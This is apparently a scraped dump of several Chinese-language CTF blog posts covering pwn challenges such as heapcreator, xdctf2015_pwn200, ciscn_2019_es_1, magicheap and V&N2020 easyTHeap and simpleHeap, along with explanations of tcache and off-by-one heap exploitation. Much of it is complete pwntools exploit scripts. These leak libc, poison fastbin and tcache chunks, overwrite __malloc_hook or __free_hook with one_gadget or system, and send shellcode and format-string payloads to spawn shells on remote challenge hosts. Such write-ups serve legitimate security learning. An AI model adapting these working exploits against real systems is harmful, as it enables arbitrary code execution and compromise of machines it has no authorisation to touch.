add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) pause() p.interactive() 又实验了两次，失败的方法终于通了 怎么说呢，比赛不给libc果然是流氓题 在github上下了俩libc都不行，最后用buuctf资源库里面提供的libc打通了 exp没变，就是多加了两行one_gadget_list(哈哈哈哈哈哈哈草) from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26902) libc = ELF('./libc-2.23.so') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] #one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] #one_gadget_list = [0x45226,0x4527a,0xf0364,0xf1207] #one_gadget_list = [0x45206,0x4525a,0xef9f4,0xf0897] one_gadget_list = [0x45216,0x4526a,0xf02a4,0xf1147] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;one_gadget:&quot; + hex(one_gadget)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) p.interactive() ","link":"https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"},{"title":"buu-pwn(1)","content":"xdctf2015_pwn200 **题，简单题，五分钟能出的题给👴整了一个多小时，全是本地的libc咋也加载不上去，干脆直接LibcSearcher 没啥好说的，只开了nx exp： from pwn import * from LibcSearcher import LibcSearcher #libc = ELF('./libc.so.6') #elf = ELF('./bof') local = 0 if local == 1: p = process('./bof') else: p = remote('node3.buuoj.cn',25267) p.recvuntil('Welcome to XDCTF2015~!\\n') offset = 0x6C + 0x4 write_plt = 0x080483C0 main_addr = 0x0804851C write_got = 0x0804A01C payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4) p.sendline(payload) write_addr = u32(p.recv()[0:4]) libc = LibcSearcher('write',write_addr) print(&quot;write:&quot; + hex(write_addr)) libc_base = write_addr - libc.dump('write') print('libcbase:' + hex(libc_base)) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') print(hex(binsh_addr)) payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr) p.sendline(payload) p.interactive() [BJDCTF 2nd]secret 第一次碰见这样的题，好题！ 没有做出来wtcl 总结，为啥没做出来？ 1，找到溢出点了但是不知道怎么利用 2，碰见一堆汇编码就看不下去了，没有仔细分析 完整解题过程： checksec发现只开了nx 拿到ida main函数： __int64 __fastcall main(__int64 a1, char **a2, char **a3) { myinit(); if ( judge(a1, a2) ) wrong(); system(&quot;cat /flag&quot;); return 0LL; } 发现是有后门的，但是好像要不触发if才可以，如果if条件满足，就会进入wrong，点进去看看是这样的 wrong函数： void __noreturn wrong() { puts(&quot;#====================================#&quot;); puts(&quot;# GAME OVER #&quot;); puts(&quot;#====================================#&quot;); write_string(&quot;# BYE BYE~ #&quot;, 0x12); printf(buf, 0x12LL); puts(&amp;byte_46B0A7); puts(&quot;@====================================@&quot;); exit(0); } 就退出程序了，那么我们点进去if里面的judge函数看看 这段无法显示为伪代码（好像是大小限制的原因，改idc脚本应该可以反编译，但是我不会orz） 仔细阅读汇编码，可以发现里面有很多比较的操作，我们走到程序里，不妨输入一个数字看看，发现是猜数字的游戏，连续猜对就可以获得flag，但是要猜10000次，在myinit函数里面 第一个点是一个指针，里面存了10000，应该就是猜对的次数，但是是指针，指针都是非常危险的～ 然后第二个点就是有一个read，可以溢出，我们点进去buf看看 可以看到那个指针就在buf下面0x10处，但是我们可控的空间是0x16，所以我们可以控制target指针。 那么我们控制到哪里呢？ 我们在pwndbg里面发现printf的plt和system的plt很接近，就差0x10，而且是printf的plt比system的大0x10，所以我们可以把target改写成printf的got地址，然后每当猜对一次target就会减一，当我们猜对15次，第十六次猜错就会调用printf 而这个时候，printf@plt已经被改成了system@plt，然后存在buf里面的字符串会被当成参数传入system，所以我们只需要在输入name的时候把binsh打进去就好了 exp： from pwn import * local = 0 #context.log_level = 'debug' if local == 1: p = process('./secret') else: p = remote('node3.buuoj.cn',25527) elf = ELF('./secret') printf_got = elf.got['printf'] payload = b'/bin/sh\\x00' + b'A' * (0x10 - 0x8) + b'\\x40\\xD0\\x46' #最后面的是printf的got地址，当然也可以用p32发过去 #print(payload) p.sendline(payload) #pause() number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(0,15): payload = number[i] p.recvuntil('Secret:') p.sendline(str(payload)) #pause() p.sendlineafter('Secret:','1') p.interactive() ciscn_2019_es_1 今天太忙了，刚搬了宿舍，换了新环境，忙里偷闲打了一道去年的国赛题 目前就找到两种思路，第一种思路打fastbin的时候有些问题，因为不太清楚python怎么传空字符串之类的问题，导致结构体里面的指针一直在变，所以这种思路等过两天有空的时候再想想吧。第二种思路就是打__free_hook，__free_hook(ready to free) === system(&quot;/bin/sh\\x00&quot;) 几个点： 当题目对于申请的chunk大小限制无要求，我们可以申请大chunk，free后放入unsorted bin直接泄漏libc 攻击__free_hook比one_gadget更简单 exp: from pwn import * from LibcSearcher import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./ciscn_2019_es_1') else: p = remote('node3.buuoj.cn',25338) def add(size,name,num): p.sendlineafter('choice:','1') p.sendlineafter('Please input the size of compary\\'s name',str(size)) p.sendafter('please input name:',name) p.sendafter('please input compary call:',num) def show(index): p.sendlineafter('choice:','2') p.sendlineafter('Please input the index:',str(index)) def delete(index): p.sendlineafter('choice:','3') p.sendlineafter('Please input the index:',str(index)) ''' print(&quot;第一种思路：利用fastbin attack 攻击__malloc_hook函数，尚未成功&quot;) print(&quot;========== step 1 : leak libc ============&quot;) add(0x410,'a','b') #0 add(0x10,'c','d') #1 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;) print(&quot;libc base : &quot; + hex(libc_base)) print(&quot;=========== step 2 : fastbin attack =========&quot;) add(0x60,'A','B') #3 delete(3) delete(3) add(0x60,p64(__malloc_hook-0x23),'hack') print(&quot;=========== step 3 : one_gadget =========&quot;) one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh') #add(0x10,'a','b') pause() p.interactive() ''' print(&quot;第二种思路：利用unsorted bin逃逸出tcache bin，然后攻击__free_hook&quot;) print(&quot;====================== step1 : leak libc =================&quot;) add(0x410,b'A' * 8,b'B') #0 add(0x10,b'/bin/sh\\00',b'D') #1 add(0x10,b'123',b'hack') #2 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 -0x10 print(hex(__malloc_hook)) libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(&quot;libc base:&quot; + hex(libc_base)) print(&quot;============ step2 : attack __free_hook function =================&quot;) print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;) print(&quot;so we need change '__free_hook' to 'system' &quot;) __free_hook = libc_base + libc.dump(&quot;__free_hook&quot;) system_addr = libc_base + libc.dump(&quot;system&quot;) delete(2) delete(2) add(0x10,p64(__free_hook),b'lemon') #3 add(0x10,p64(system_addr),b'hack') #4 delete(2) p.interactive() 临时加个攻防世界：string 这个题是有个师傅问我的，其实原来做过了，但是好久没有玩过格式化字符串漏洞了，就重新做一下 收获的几个点： 1，注意mmap函数的第三个参数 2，shellcode = asm(shellcraft.sh())能打通，如果再加上str()就不可以了 exp: from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./dragon') else: p = remote('220.249.52.133',37799) p.recvuntil(&quot;secret[0] is &quot;) address = int(p.recvuntil(&quot;\\n&quot;),16) print(hex(address)) p.sendlineafter(&quot;What should your character's name be:\\n&quot;,'name') p.sendlineafter(&quot;So, where you will go?east or up?:\\n&quot;,'east') p.sendlineafter(&quot;go into there(1), or leave(0)?:\\n&quot;,'1') p.sendlineafter(&quot;'Give me an address'\\n&quot;,str(address)) print(&quot;经过测试，发现格式化字符串是第7个参数&quot;) payload = fmtstr_payload(7,{address:85}) p.sendlineafter(&quot;And, you wish is:\\n&quot;,payload) print(&quot;经过格式化字符串，我们可以发送shellcode了，因为mmap的第三个参数&quot;) context(os = 'linux',arch = 'amd64') shellcode = asm(shellcraft.sh()) #shellcode = asm(shellcraft.amd64.linux.sh()) print(shellcode) #shellcode = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot; p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL&quot;) p.sendline(shellcode) p.interactive() wustctf2020_closed 学到了，抽空得学习下IO_FILE的知识 0，1，2 分别对应 stdin stdout stderr close(1) close(2)是关闭了将程序的输出显示到屏幕上，并且关闭了报错信息 可以看到我们其实已经拿到了shell，那么我们直接重定向就好 exec 1&gt;&amp;0 不需要exp 直接nc就好 hitcontraining_magicheap 逆向 main函数，发现框起来的地方有些可疑 点开函数，发现有后门 创建堆块 编辑堆块，存在漏洞，可以自定义堆块编辑的大小（老漏洞了 删除堆块，🈚️UAF 因为没有show函数之类的，所以很难泄漏信息，正好程序没开pie，干脆直接利用后门，想办法在magic附近伪造chunk find_fake_fast永远滴神！！ exp 环境可能出问题了，同样的exp打了十次才通，本地是通了，远程也终于通了 from pwn import * context.log_level = 'debug' local = 0 if local == 1: p = process('./magicheap') else: p = remote('node3.buuoj.cn',25199) def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:',content) def edit(index,size,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendlineafter('Size of Heap :',str(size)) p.sendafter('Content of heap:', content) def free(index): p.sendlineafter('Your choice :', '3') p.sendlineafter('Index :',str(index)) print(&quot;===== 第一种思路： 不管后门，直接fastbin attack 打mallochook ======&quot;) print(&quot;======= 但是没有show函数，我们无法泄漏libc ======&quot;) print(&quot;所以综上考虑，要不我们还是利用后门好了-.-||&quot;) ''' add(0x10,b'A' * 8) #chunk0 add(0x30,b'a' * 8) #chunk1 free(1) fake_chunk = 0x602062 payload = 0x10 * b'A' + p64(0) + p64(0x41) + p64(fake_chunk) print(&quot;payload length:&quot; + str(len(payload))) #print(p.recv()) #edit(0,41,payload) ''' print(&quot;double free搞一下&quot;) add(0x30,'A') #chunk0 add(0x60,'B') #chunk1 fake_chunk = 0x60207D free(1) payload = 0x30 * b'A' + p64(0) + p64(0x71) + p64(fake_chunk) print(&quot;这里不知道哪里错了，编辑功能总是上不去，可能是函数内部编写的有问题，懒得看了-.-&quot;) p.sendline('2') p.sendline('0') p.sendline(str(len(payload))) p.send(payload) #edit(0,len(payload),payload) add(0x60,p64(fake_chunk)) payload = 0x13 * b'A' + p64(0x1306) add(0x60,payload) p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn1/"},{"title":"[V&N2020 公开赛]easyTHeap","content":"用这个题来总结一下tcache attack 关于tcache参考了这个师傅的博客：https://www.jianshu.com/p/9778331e1337 tcache tcache结构体 Tcache机制是在libc-2.26中引入的一个新的堆管理机制。 首先是引进了两个结构体，tcache_perthread_struct和tcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; 第一个结构体用来管理堆，大小为0x240，可以管理大小小于0x400的堆块，为啥呢？写个简单的小demo大家就明白了 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } 上面简单的例子，就是申请了从0x10-0x70大小的堆块，然后我们全部都free掉，然后gdb调试一下会发现如下结果 可以看到tcache_perthread_struct结构体是以一个堆的形式存在于堆空间中管理者堆块，其大小为 0x250，然后不考虑其prevsize和size位，前0x40的空间管理着所有tcache bin的个数（最大是7），从0x10开始，那么就是 0x40 * 8 * 2 = 1024，hex(1024) = 0x400，所以它最大可存到0x400的堆块。 对比fastbin tcache bin与fastbin极其相似但是又有所不同 同：管理方式为FILO的单链表形式，每一个bins的inuse位总为1，不担心合并 异：fastbin的fd的指针指向chunk ptr，而tcache指向mem ptr。tcache不检查chunk的size是否符合要求，也就是说指哪打哪，不用考虑size位了，比如打__malloc_hook不用分配到-0x23的位置了，想分配到哪就分配到哪。tcache不检查double free。tcache优先级最高。 malloc和free的过程 malloc： malloc(size)，若size小于0x400会优先从tcache bins里面寻找，若没有，则再从别的bins里面找。 Tcachebin未满时，却从Fastbin/Smallbin中取出堆块，则会将链上的其他堆块都链入Tcachebin中。其具体算法是首先将Fastbin/Smallbin中取出的堆块指针进行保存，并判断该大小对应的Tcachebin是否未满，若未满则将其之后的堆块按照Fastbin/Smallbin的分配顺序将堆块链入Tcachebin中，直到对应大小的Tcachebin放满或Fastbin/Smallbin的链为空，最后将之前取出的堆块指针返回给用户使用。由于是按照Fastbin/Smallbin的分配顺序将堆块放入Tcachebin中，因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的。 文字看不懂（我也没看懂 orz）？没关系，上代码。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } 没错，申请了十个相同大小的chunk，然后全部free掉，其中c开头的是放到tcache bins中的，f开头的是tcache满了然后被放到了fastbins里面中去。 看一下内存分布 然后我们改一下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } 思路就是我们将tcachebin填满，然后free3次同样大小的chunk，发现进入到fastbin里面，然后我们通过malloc将tcachebin全部清空，如下图 可以看到此时tcachebin已经空了 fastbin里面是这样的 然后再malloc一次，发现fastbin被清空，剩余的两个bin被移到tcachebin里面去 本来是350指向330 移入到tcache后变成了340(0x350 - 0x10)指向了360 证明了前文的结论，“因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的”。 利用方法 贴个大佬总结的，我仔细看了看这几个方法的说明，本题目应该用了以下前三个漏洞，其实叫啥名不重要，会用就行~ Tcache poisoning（tcache 投毒） 在上一部分中也提到过这种方法。与Fastbin Attack类似，篡改Tcachebin中的fd字段，导致在申请被篡改堆块后的下一个堆块时能够申请到任意地址。与Fastbin相比，Tcachebin中为了得到更高的效率而舍去了安全性，在进行申请时没有对size位进行校验，而且由于Tcachebin中的fd是指向下一个堆块的fd(Fastbin的fd是指向下一个堆块的堆头)，因此指向的地址即是申请后写数据的地址，不再需要去考虑堆头的偏移。 Tcache dup（？？？） 这是Tcache机制刚推出的几个版本中，在进行free操作时没有对这个堆块进行一个安全检测而导致可以对同一个堆块进行多次free，那么就会变成一个Tcachebin链上链了两个相同的堆块(我指向我自己)，后面也就不用多说了。但值得一提的是在libc-2.29版本中加入了检查机制(源码的4201-4216行)，会在堆块进行free时检查这个堆块是否已经存在于这条链上，如果存在则会报&quot;free():double free detected in tcache 2&quot;的错误，因此这种直接double free利用方式存在于libc-2.26至libc-2.28的版本中。 Tcache perthread corruption （结构体污染） 在最开始介绍结构体时提到的tcache_perthread_struct结构体，该结构体size为0x250，是管理整个Tcachebin的结构体，如果对这个结构体有写权限，那么可以控制任意大小Tcachebin的入口地址。 U2T（翻译君死了） U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也只看到过一次，主要是配合Off By One或Off By NULL的漏洞，使Unsortbin在合并过程中将中间的Tcachebin合并，从而达到修改fd字段的效果。 题目 逆向 稍微逆一下就发现了delete的时候存在UAF漏洞 不过必须要注意的是，我们只能malloc 7次，free 3次 pwn it !!! 这道题保护全开，所以我们可以攻击__malloc_hook 思路： 1，攻击__malloc_hook，必须要伪造chunk，我们可以利用tcache的特点，利用结构体污染，将tcache_perthread_struct的指针域改为__malloc_hook附近 2，污染结构体，必须要能分配到结构体上，我们可选择double free，但是前提必须要知道结构体的地址，我们可以利用show来泄漏地址，malloc(size),free(),free()，这样该chunk就记录了自己的地址，减去0x250就是结构体的地址 3，打one_gadget，必须要知道libc基地址，我们利用free态的结构体堆块（0x250会进入unsorted bin），泄漏main_arena上方的__malloc_hook拿到基地址 一种方法 唔……，本地只有2.28版本的libc，所以本地不可能打通，简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:逃逸tcache ==============&quot;) print(&quot;-------- 利用double free，将fd ptr 写到 tcache处 -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- 改写tcahche结构体中堆块的数量，使以后的chunk可以不进入tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct 但是这里的size仍然是0x251 edit(3,b'a' * 0x30) print('================= step2:泄漏libc ==============') print('----- 利用3号堆块（tcache结构体堆块），释放后进入unsorted bin中，泄漏libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- 获得一些函数和one gadget的地址 ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: 攻击 __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() 另一种方法 （似乎还有别的方法，我再想想还能不能用别的方法做出来（逃 ） 好像又找到了一种构造方式，本质思路没有变，细节稍微改动了一下，比如泄漏libc换成了0号chunk（哈哈哈 from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: 逃逸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: 泄漏libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #触发one_gadget p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 公开赛]simpleHeap","content":"通过这个题目来学习 off-by-one 什么是off by one(null) ? 定义我也不知道，直接说我的理解。就是那种在用户输入时，一个循环处理边界问题或者是数组越界，对我们的输入没有很好的处理，就会导致一个字节的溢出（或者是strcpy处理不当）。 利用off-by-one 有师傅喜欢叫off-by-one 为一个字节的偷渡攻击 给攻击者发挥的攻击空间也只有一个字节，所以利用方式还是有一定限制的 我们最常利用的（或许是）手法是 堆块重叠（chunk extend），跟我之前讲过的“堆块怀孕”本质是一个东西，chunk extend 的利用条件如下： 1，能够进行堆空间的布局（即写入之类的功能） 2，至少能够溢出一个字节 其中第二个条件正好符合off-by-one的情景 利用过程：off-by-one + chunk extend 由于本人水平有限（wtcl orz 所以就举两个例子好了，一个是开启了Full RELRO，一个没开启 got表无防护的利用情景 既然got表无防护，那么我们可以利用这一个字节的溢出来改写got表，看详细的c代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } 思路是申请三个chunk，大小分别为0x18,0x20,0x30 第一个chunk用来出发off-by-one 漏洞，第二个chunk用来构筑堆块重叠，第三个chunk用来构筑 fake chunk，我们利用第一个chunk溢出一字节来改写第二个chunk的size位，然后将第三个chunk来包含进去，然后free两次，在malloc一次，拿到big chunk的控制权，通过向big chunk里写入内容，改写free small chunk的fd pointer(此时smaller chunk还是free态)，接着malloc两次，我们就能够拿到一个fake chunk，如果fake chunk位于got表附近，那么我们便可以劫持got表项继而拿到shell 接下来我们看具体的调试过程。 malloc拿到三个堆块： 人为构造一个off-by-one来溢出一字节： free两次，可以看到我们改写后的chunk已经变成了free态： 通过向big chunk里写内容可以改写fd pointer，可以看到2号chunk的pointer已经变成了‘AAAA’…… 这个便是劫持got表的流程 got 表不可写： 对于got表项不可写的elf，我们可以借鉴fastbin attack的思路来攻击__malloc_hook函数，将__malloc_hook函数改写成one_gadget，触发malloc拿shell 思路很简单，大体思路和上面一样，然后三号chunk的fd pointer可以写成__malloc_hook+23的位置（字节错位，具体原因不再赘述），然后将__malloc_hook改写即可，注意的是，为了达到fastbin attack的目的，我们3号块的mem大小必须是0x60，因为要把0x7f的fake chunk链接在同一个bin中 题目解析： 逆向过程： 代码量尚可，off-by-one的漏洞还是有一定隐秘性的，具体的逆向分析不再赘述 注意两个点即可： 第一，本程序不存在UAF漏洞，即delete函数中对free的chunk处理的很好，把free态的指针数据都给清空了 第二，就是off-by-one的产生的位置 可以看到，if判断语句是小于号，也就是说当变量等于size+1的时候依然可以可以读入数据，这就是典型的off-by-one漏洞 pwn it ！！！ 思路分析 这个程序保护全开，所以我们不能攻击got表了，我们只能选择__malloc_hook函数，但是我们要想找到__malloc_hook函数，我们必须泄漏libc，但是程序只允许我们申请fastbin大小的chunk 这个题有一个很巧妙的泄漏libc的方法，就是将两个fastbin合并成一个unsortedbin，利用unsorted bin来泄漏main_arena + 88的位置，然后拿到libc基址。 具体思路是这样的，构造四个chunk： chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 （防止与top chunk合并） 我们通过off-by-one将1和2合并，free 1，这个时候1和2合并的chunk已经超过fastbin，进入unsorted bin，我们再malloc(0x50)，这个时候unsorted bin就会切割下来0x50，剩下2号chunk留在unsorted bin里面，但是！！我们从始至终都没有free chunk 2，2号指针的控制权仍然在我们手中，所以我们可以打印2号chunk的内容，为什么呢？因为2号chunk在unsorted bin里，其fd 和 bk都是有内容的！！他们都指向了main_arena + 88，通过这一点，我们就能泄漏出libc的基地址 我们拿到基址后，就得想办法fastbin attack，有一种办法就是我们上文说的方法，构造三个fastbin chunk，自然是可以的，但是如果题目限制我们malloc次数，我们还有办法吗？（这个题目虽然限制次数，但是依然申请三次依然在允许的范围之内） 答案是有的，我们可以malloc(0x60)，记成chunk 4，然后我们紧接着free 4，这么做的目的就是将这块chunk从unsorted bin中移动到 fastbin中，so 我们再次利用 allocated 态的2号pointer来edit，把fd位改成__malloc_hook - 0x23，然后one_gadget 